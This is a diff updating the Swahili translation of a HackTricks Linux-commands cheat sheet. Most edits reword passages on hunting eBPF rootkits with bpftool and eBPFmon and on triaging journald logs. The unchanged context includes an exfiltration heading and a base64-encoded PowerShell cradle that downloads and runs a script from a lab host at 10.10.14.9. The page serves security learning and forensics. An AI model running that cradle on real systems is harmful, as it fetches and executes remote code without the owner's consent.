@@ -1,5 +1,7 @@
 # Amri Muhimu za Linux
 
+{{#include ../../banners/hacktricks-training.md}}
+
 ## Bash za Kawaida
 ```bash
 #Exfiltration using Base64
@@ -127,7 +129,7 @@ sudo chattr -i file.txt #Remove the bit so you can delete it
 # List files inside zip
 7z l file.zip
 ```
-## Bash kwa Windows
+## Bash ya Windows
 ```bash
 #Base64 for Windows
 echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
@@ -299,9 +301,9 @@ iptables -P INPUT DROP
 iptables -P FORWARD ACCEPT
 iptables -P OUTPUT ACCEPT
 ```
-## eBPF Telemetry na Uwindaji wa Rootkit
+## eBPF Telemetry & Uwindaji wa Rootkit
 
-Utafiti wa Rootkit umeonyesha implants zinazotumia eBPF kama TripleCross, pamoja na backdoors zinazotumia BPF kama variants za BPFDoor. Chukulia programu, attachments, au maps za BPF zisizotarajiwa kama vidokezo vya uchunguzi badala ya ushahidi wa compromise.<sup>[[3]](#references)[[4]](#references)</sup> Weka baseline ya mifumo iliyoidhinishwa ukitumia `bpftool` au `eBPFmon`: `bpftool` inaweza kuorodhesha programs na maps, kutupa maagizo ya program, na kuuliza features zinazotumika, huku eBPFmon ikiwasilisha taarifa hiyo katika TUI.<sup>[[1]](#references)[[5]](#references)[[6]](#references)</sup>
+Utafiti wa Rootkit umeonyesha implants zinazotegemea eBPF kama vile TripleCross na backdoors zinazotegemea BPF kama variants za BPFDoor. Chukulia BPF programs, attachments, au maps zisizotarajiwa kama vidokezo vya uchunguzi badala ya uthibitisho wa compromise.<sup>[[3]](#references)[[4]](#references)</sup> Weka baseline ya mifumo iliyoidhinishwa kwa `bpftool` au `eBPFmon`: `bpftool` inaweza kuorodhesha programs na maps, kufanya dump ya program instructions, na kuuliza supported features, huku eBPFmon ikiwasilisha taarifa hiyo katika TUI.<sup>[[1]](#references)[[5]](#references)[[6]](#references)</sup>
 ```bash
 #Enumerate all eBPF programs, attach points, owning PIDs and map IDs
 sudo bpftool prog
@@ -319,11 +321,11 @@ sudo bpftool feature probe | less
 #TUI wrapper that tracks program/map diffs in real time (wraps bpftool perf/net output)
 sudo ebpfmon
 ```
-Linganisha output ya `bpftool` na NIC/cgroup attachments zinazotarajiwa; `xdp` au `kprobe` program inayomilikiwa na PID isiyoidhinishwa ghafla ni dalili ya kuanzia uchunguzi, si ushahidi wa mwisho wa payload iliyoingizwa.<sup>[[5]](#references)[[6]](#references)</sup>
+Linganisha matokeo ya `bpftool` na viambatisho vya NIC/cgroup vinavyotarajiwa; `xdp` au `kprobe` program inayomilikiwa na PID ambayo haijaidhinishwa ni mwongozo wa uchunguzi, si uthibitisho wa mwisho wa payload iliyodungwa.<sup>[[5]](#references)[[6]](#references)</sup>
 
-## Uchunguzi wa Awali wa Matukio ya Journald
+## Uchunguzi wa Awali wa Tukio la Journald
 
-`journalctl` husoma maingizo yenye muundo kutoka kwa `systemd-journald` na inaunga mkono uchujaji kwa boot, priority, unit, UID, na muda wa kulinganisha. Changanya vichujio hivyo na output ya JSON unapohitaji kuhifadhi au kulinganisha ushahidi; kuchuja pekee hakuthibitishi kuwa logs hazikubadilishwa.<sup>[[2]](#references)[[7]](#references)</sup>
+`journalctl` husoma maingizo yaliyopangwa kutoka kwa `systemd-journald` na inasaidia kuchuja kwa boot, priority, unit, UID, na muda wa kulinganisha. Changanya vichujio hivyo na matokeo ya JSON unapohitaji kuhifadhi au kulinganisha ushahidi; kuchuja pekee hakuthibitishi kwamba logi hazikubadilishwa.<sup>[[2]](#references)[[7]](#references)</sup>
 ```bash
 journalctl --list-boots                                #Enumerate boot IDs with timestamps
 journalctl -b -1 -p err -o short-iso                   #Previous boot only, severity >= err
@@ -334,15 +336,15 @@ journalctl --disk-usage                               #Quickly show journal size
 sudo journalctl --vacuum-size=1G --vacuum-time=7days   #Trim only after taking evidence
 journalctl --no-pager --since="2025-06-01" --until="2025-06-10" > system_logs_2025-06-01_to_06-10.log
 ```
-Ongeza `--grep 'Invalid user' --case-sensitive` au `-k` (ujumbe wa kernel pekee) unapohitaji vichujio sahihi zaidi, na kumbuka kuwa selectors `_PID`, `_SYSTEMD_UNIT`, `_HOSTNAME`, na `_TRANSPORT` zinaweza kuunganishwa kwa utafutaji unaolengwa.<sup>[[7]](#references)</sup>
+Ongeza `--grep 'Invalid user' --case-sensitive` au `-k` (ujumbe wa kernel pekee) unapohitaji vichujio mahususi zaidi, na kumbuka kuwa selectors `_PID`, `_SYSTEMD_UNIT`, `_HOSTNAME`, na `_TRANSPORT` zinaweza kuunganishwa kwa uchunguzi unaolengwa.<sup>[[7]](#references)</sup>
 
 ## References
 
 - [1] [eBPFmon: Zana mpya ya kuchunguza na kuingiliana na applications za eBPF](https://redcanary.com/blog/linux-security/ebpfmon/)
-- [2] [Jinsi ya kutumia command ya journalctl kutazama logs za Linux](https://www.hostinger.com/tutorials/journalctl-command)
+- [2] [Jinsi ya kutumia command ya journalctl kuangalia logs za Linux](https://www.hostinger.com/tutorials/journalctl-command)
 - [3] [h3xduck/TripleCross](https://github.com/h3xduck/TripleCross)
 - [4] [Rapid7 Labs: BPFdoor katika mitandao ya Telecom](https://www.rapid7.com/blog/post/tr-bpfdoor-telecom-networks-sleeper-cells-threat-research-report/)
 - [5] [Nyaraka za BPF — Nyaraka za Linux Kernel](https://docs.kernel.org/bpf/)
 - [6] [libbpf/bpftool](https://github.com/libbpf/bpftool)
-- [7] [journalctl(1) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man1/journalctl.1.html)
+- [7] [journalctl(1) — Ukurasa wa manual wa Linux](https://man7.org/linux/man-pages/man1/journalctl.1.html)
 {{#include ../../banners/hacktricks-training.md}}
